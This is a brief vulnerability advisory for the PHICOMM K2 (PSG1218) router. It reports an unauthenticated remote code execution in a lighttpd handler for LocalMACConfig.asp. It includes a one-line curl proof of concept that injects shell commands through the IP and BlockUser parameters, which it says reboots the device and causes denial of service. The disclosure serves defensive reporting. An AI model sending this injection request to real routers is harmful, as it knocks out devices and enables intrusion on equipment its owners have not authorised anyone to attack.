vendor:PHICOMM
product:K2(PSG1218)
version:V22.5.11.5 and earlier	
type:remote code execution
description:There is a url which we can access without credentials in an ajax function, and then our automated vulnerability detection tool 
            discovered a remote code execution in this url handling function in lighthttpd, which affects about 600, 000 devices.
poc: curl 'http://ip:port/LocalMACConfig.asp?action=set&MAC=1&IP=;&DeviceRename=1&isBind=1&ifType=reboot&BlockUser=-f;&UpMax=0&DownMax=0'

(this poc can reboot the router, resulting in ddos.)
author:Yuan Ming
institution:Beihang University
  
           
